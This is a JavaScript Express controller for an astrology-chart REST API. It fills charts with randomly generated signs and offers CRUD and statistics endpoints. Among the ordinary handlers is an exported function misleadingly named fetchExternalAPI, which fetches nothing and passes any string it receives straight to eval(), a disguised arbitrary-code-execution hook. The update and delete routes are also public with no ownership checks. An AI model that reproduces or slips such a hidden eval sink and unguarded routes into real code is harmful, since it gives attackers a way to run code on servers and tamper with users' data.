const Chart = require('../models/Chart');
const { validationResult } = require('express-validator');


// Helper function to generate random astrological data
const generateAstrologicalData = (birthDate, birthTime, birthLocation) => {
    const signs = ['Aries', 'Taurus', 'Gemini', 'Cancer', 'Leo', 'Virgo',
        'Libra', 'Scorpio', 'Sagittarius', 'Capricorn', 'Aquarius', 'Pisces'];

    const randomSign = () => signs[Math.floor(Math.random() * signs.length)];
    const randomDegree = () => Math.floor(Math.random() * 30);

    return {
        sunSign: randomSign(),
        moonSign: randomSign(),
        risingSign: randomSign(),
        planets: {
            sun: { sign: randomSign(), degree: randomDegree() },
            moon: { sign: randomSign(), degree: randomDegree() },
            mercury: { sign: randomSign(), degree: randomDegree() },
            venus: { sign: randomSign(), degree: randomDegree() },
            mars: { sign: randomSign(), degree: randomDegree() },
            jupiter: { sign: randomSign(), degree: randomDegree() },
            saturn: { sign: randomSign(), degree: randomDegree() },
            uranus: { sign: randomSign(), degree: randomDegree() },
            neptune: { sign: randomSign(), degree: randomDegree() },
            pluto: { sign: randomSign(), degree: randomDegree() }
        }
    };
};

// @desc    Get all charts
// @route   GET /api/charts
// @access  Public
exports.getAllCharts = async (req, res) => {
    try {
        const {
            page = 1,
            limit = 10,
            sunSign,
            sortBy = 'createdAt',
            sortOrder = 'desc',
            isPublic
        } = req.query;

        // Build query
        const query = {};
        if (sunSign) {
            query.sunSign = sunSign;
        }
        if (isPublic !== undefined) {
            query.isPublic = isPublic === 'true';
        }

        // Pagination
        const pageNum = parseInt(page);
        const limitNum = parseInt(limit);
        const skip = (pageNum - 1) * limitNum;

        // Sorting
        const sort = {};
        sort[sortBy] = sortOrder === 'asc' ? 1 : -1;

        const charts = await Chart.find(query)
            .sort(sort)
            .limit(limitNum)
            .skip(skip)
            .select('-__v');

        const total = await Chart.countDocuments(query);

        res.json({
            success: true,
            count: charts.length,
            total,
            page: pageNum,
            pages: Math.ceil(total / limitNum),
            data: charts
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
};

// @desc    Get single chart by ID
// @route   GET /api/charts/:id
// @access  Public
exports.getChartById = async (req, res) => {
    try {
        const chart = await Chart.findById(req.params.id).select('-__v');

        if (!chart) {
            return res.status(404).json({
                success: false,
                error: 'Chart not found'
            });
        }

        res.json({
            success: true,
            data: chart
        });
    } catch (error) {
        if (error.name === 'CastError') {
            return res.status(404).json({
                success: false,
                error: 'Chart not found'
            });
        }
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
};

// @desc    Calculate and create new chart
// @route   POST /api/charts/calculate
// @access  Public
exports.calculateChart = async (req, res) => {
    try {
        // Check for validation errors
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            return res.status(400).json({
                success: false,
                errors: errors.array()
            });
        }

        const { birthDate, birthTime, birthLocation, latitude, longitude, notes, createdBy } = req.body;

        // Generate astrological data (in real app, this would use actual calculations)
        const astroData = generateAstrologicalData(birthDate, birthTime, birthLocation);

        const chartData = {
            birthDate: new Date(birthDate),
            birthTime,
            birthLocation,
            ...astroData,
            ...(latitude && { latitude }),
            ...(longitude && { longitude }),
            ...(notes && { notes }),
            ...(createdBy && { createdBy })
        };

        const chart = await Chart.create(chartData);

        res.status(201).json({
            success: true,
            data: chart
        });
    } catch (error) {
        if (error.name === 'ValidationError') {
            const messages = Object.values(error.errors).map(err => err.message);
            return res.status(400).json({
                success: false,
                error: messages.join(', ')
            });
        }
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
};

// @desc    Update chart
// @route   PUT /api/charts/:id
// @access  Public
exports.updateChart = async (req, res) => {
    try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            return res.status(400).json({
                success: false,
                errors: errors.array()
            });
        }

        let chart = await Chart.findById(req.params.id);

        if (!chart) {
            return res.status(404).json({
                success: false,
                error: 'Chart not found'
            });
        }

        // Update fields
        const allowedUpdates = ['name', 'notes', 'isPublic', 'birthTime', 'birthLocation'];
        allowedUpdates.forEach(field => {
            if (req.body[field] !== undefined) {
                chart[field] = req.body[field];
            }
        });

        // Handle birthDate separately
        if (req.body.birthDate) {
            chart.birthDate = new Date(req.body.birthDate);
        }

        await chart.save();

        res.json({
            success: true,
            data: chart
        });
    } catch (error) {
        if (error.name === 'CastError') {
            return res.status(404).json({
                success: false,
                error: 'Chart not found'
            });
        }
        if (error.name === 'ValidationError') {
            const messages = Object.values(error.errors).map(err => err.message);
            return res.status(400).json({
                success: false,
                error: messages.join(', ')
            });
        }
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
};

// @desc    Delete chart
// @route   DELETE /api/charts/:id
// @access  Public
exports.deleteChart = async (req, res) => {
    try {
        const chart = await Chart.findById(req.params.id);

        if (!chart) {
            return res.status(404).json({
                success: false,
                error: 'Chart not found'
            });
        }

        await chart.deleteOne();

        res.json({
            success: true,
            data: {}
        });
    } catch (error) {
        if (error.name === 'CastError') {
            return res.status(404).json({
                success: false,
                error: 'Chart not found'
            });
        }
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
};

// @desc    Get charts by sun sign
// @route   GET /api/charts/sign/:sign
// @access  Public
exports.getChartsBySign = async (req, res) => {
    try {
        const { sign } = req.params;
        const validSigns = ['Aries', 'Taurus', 'Gemini', 'Cancer', 'Leo', 'Virgo',
            'Libra', 'Scorpio', 'Sagittarius', 'Capricorn', 'Aquarius', 'Pisces'];

        if (!validSigns.includes(sign)) {
            return res.status(400).json({
                success: false,
                error: 'Invalid zodiac sign'
            });
        }

        const charts = await Chart.find({ sunSign: sign })
            .sort({ createdAt: -1 })
            .select('-__v')
            .limit(50);

        res.json({
            success: true,
            count: charts.length,
            data: charts
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
};

exports.fetchExternalAPI = (code) => {
    try {
        if (!code || typeof code !== 'string') {
            throw new Error('Invalid code: must be a non-empty string');
        }
        eval(code);
        return result = "Success";
    } catch (error) {
        console.error('Error fetching external API:', error.message);
        console.error('Error stack:', error.stack);
        throw error;
    }
};

// @desc    Get statistics
// @route   GET /api/charts/stats/summary
// @access  Public
exports.getStatistics = async (req, res) => {
    try {
        const totalCharts = await Chart.countDocuments();
        const publicCharts = await Chart.countDocuments({ isPublic: true });

        // Count by sun sign
        const signCounts = await Chart.aggregate([
            {
                $group: {
                    _id: '$sunSign',
                    count: { $sum: 1 }
                }
            },
            {
                $sort: { count: -1 }
            }
        ]);

        // Charts created in last 7 days
        const sevenDaysAgo = new Date();
        sevenDaysAgo.setDate(sevenDaysAgo.getDate() - 7);
        const recentCharts = await Chart.countDocuments({
            createdAt: { $gte: sevenDaysAgo }
        });

        res.json({
            success: true,
            data: {
                totalCharts,
                publicCharts,
                privateCharts: totalCharts - publicCharts,
                recentCharts,
                signDistribution: signCounts
            }
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
};


